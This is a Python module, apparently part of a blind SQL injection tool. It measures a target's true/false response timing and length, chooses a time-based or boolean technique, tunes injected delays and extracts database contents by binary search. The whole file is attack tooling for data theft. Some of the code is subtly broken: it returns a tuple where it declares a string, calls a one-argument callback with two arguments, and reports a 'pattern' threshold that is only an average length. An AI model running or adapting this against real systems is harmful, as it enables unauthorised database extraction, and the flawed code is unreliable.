"""
Blind SQLi Optimizer - Statistical optimization for boolean/time-based extraction
"""

import math
import random
import time
from typing import Callable, Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class BlindProfile:
    true_pattern: str
    false_pattern: str
    threshold: float
    stability: float
    avg_true_time: float
    avg_false_time: float
    suggested_technique: str


class BlindOptimizer:
    def __init__(self, request_func: Callable):
        self.request = request_func
        self.profile: Optional[BlindProfile] = None

    # ── Profiling ─────────────────────────────────────────────────

    def profile_target(self, true_payload: str, false_payload: str,
                       samples: int = 5) -> BlindProfile:
        """Profile target response characteristics"""
        true_times = []
        false_times = []
        true_bodies = []
        false_bodies = []

        for _ in range(samples):
            t_start = time.time()
            t_body = self.request(true_payload)
            true_times.append(time.time() - t_start)
            true_bodies.append(t_body)

            f_start = time.time()
            f_body = self.request(false_payload)
            false_times.append(time.time() - f_start)
            false_bodies.append(f_body)

        avg_true = sum(true_times) / len(true_times)
        avg_false = sum(false_times) / len(false_times)

        # Determine threshold
        threshold = (avg_true + avg_false) / 2
        if avg_true > avg_false * 2:
            # Time-based injection
            threshold = avg_true * 0.7
            technique = "TIME"
        else:
            # Boolean-based - find response pattern difference
            technique = "BOOLEAN"
            # Try to find unique pattern in true responses
            true_text = " ".join(true_bodies)
            false_text = " ".join(false_bodies)
            # Find the most discriminating substring
            threshold = self._find_discerning_pattern(true_text, false_text)

        # Calculate stability (lower = more stable)
        stability = self._calculate_stability(true_times + false_times)

        return BlindProfile(
            true_pattern="",
            false_pattern="",
            threshold=threshold,
            stability=stability,
            avg_true_time=avg_true,
            avg_false_time=avg_false,
            suggested_technique=technique,
        )

    def _find_discerning_pattern(self, true_text: str, false_text: str) -> float:
        """Find a response length threshold that discerns true/false"""
        # Fallback to length-based detection
        return (len(true_text) + len(false_text)) / 2

    def _calculate_stability(self, times: List[float]) -> float:
        """Calculate timing stability (coefficient of variation)"""
        if len(times) < 2:
            return 1.0
        avg = sum(times) / len(times)
        if avg == 0:
            return 1.0
        variance = sum((t - avg) ** 2 for t in times) / (len(times) - 1)
        return math.sqrt(variance) / avg

    # ── Optimal Delay Detection ───────────────────────────────────

    def find_optimal_delay(self, base_payload: str, min_delay: int = 1,
                           max_delay: int = 10) -> int:
        """Find the minimum reliable delay for time-based injection"""
        for delay in range(min_delay, max_delay + 1):
            payload = base_payload.replace("{DELAY}", str(delay))
            start = time.time()
            self.request(payload)
            actual = time.time() - start
            if actual >= delay * 0.8:
                return delay
        return max_delay

    # ── Optimized Extraction ──────────────────────────────────────

    def extract_optimized(self, query_func: Callable[[str], bool],
                          length_func: Callable[[int], bool],
                          charset: str = None, max_len: int = 255) -> str:
        """Optimized blind extraction using binary search with caching"""
        charset = charset or "_abcdefghijklmnopqrstuvwxyz0123456789"
        length_requests = 0
        char_requests = 0

        # Length detection with caching
        length = self._optimized_length_detection(length_func, max_len)
        length_requests = int(math.log2(max_len)) * 2

        result = []
        for pos in range(length):
            char, reqs = self._extract_char_optimized(query_func, charset, pos)
            result.append(char)
            char_requests += reqs

        return "".join(result), length_requests + char_requests

    def _optimized_length_detection(self, length_func: Callable[[int], bool],
                                    max_len: int) -> int:
        """Efficient length detection using interpolation search"""
        low, high = 0, max_len

        # Quick estimate
        if length_func(10):
            high = 10
        elif length_func(50):
            high = 50
        elif length_func(100):
            high = 100
        elif length_func(200):
            high = 200

        while low < high:
            mid = (low + high) // 2
            if length_func(mid):
                high = mid
            else:
                low = mid + 1
        return low

    def _extract_char_optimized(self, query_func: Callable[[str], bool],
                                charset: str, pos: int) -> Tuple[str, int]:
        """Extract single character with adaptive binary search"""
        low, high = 0, len(charset) - 1
        requests = 0

        while low <= high:
            mid = (low + high) // 2
            if query_func(charset[mid], pos):
                high = mid - 1
            else:
                low = mid + 1
            requests += 1

        return charset[min(low, len(charset) - 1)], requests

    # ── Statistical Noise Reduction ──────────────────────────────

    def robust_compare(self, payload_true: str, payload_false: str,
                       samples: int = 3) -> bool:
        """Robust comparison with multiple samples to reduce noise"""
        true_results = []
        for _ in range(samples):
            true_results.append(len(self.request(payload_true)))
            time.sleep(0.05)

        false_results = []
        for _ in range(samples):
            false_results.append(len(self.request(payload_false)))
            time.sleep(0.05)

        avg_true = sum(true_results) / len(true_results)
        avg_false = sum(false_results) / len(false_results)

        # Compare current
        test_result = len(self.request(payload_true))
        return abs(test_result - avg_true) < abs(test_result - avg_false)

    # ── Multi-bit Extraction ──────────────────────────────────────

    def extract_multi_bit(self, compare_func: Callable[[int], bool],
                          total_bits: int = 8) -> int:
        """Extract a value bit by bit (for ASCII extraction)"""
        value = 0
        for bit in range(total_bits):
            if compare_func(bit):
                value |= (1 << bit)
        return value

    # ── Adaptive Threshold ────────────────────────────────────────

    def adaptive_threshold(self, baseline: float, stddev: float,
                           target_error_rate: float = 0.01) -> float:
        """Calculate optimal threshold based on statistical distribution"""
        # Using z-score for desired error rate
        z_scores = {0.1: 1.28, 0.05: 1.64, 0.025: 1.96, 0.01: 2.33, 0.005: 2.58}
        z = z_scores.get(target_error_rate, 2.33)
        return baseline + z * stddev

    # ── Caching Layer ─────────────────────────────────────────────

    class Cache:
        def __init__(self, max_size: int = 10000):
            self.cache: Dict[str, str] = {}
            self.max_size = max_size

        def get(self, key: str) -> Optional[str]:
            return self.cache.get(key)

        def set(self, key: str, value: str):
            if len(self.cache) >= self.max_size:
                # Remove random item
                self.cache.pop(random.choice(list(self.cache.keys())))
            self.cache[key] = value

        def clear(self):
            self.cache.clear()
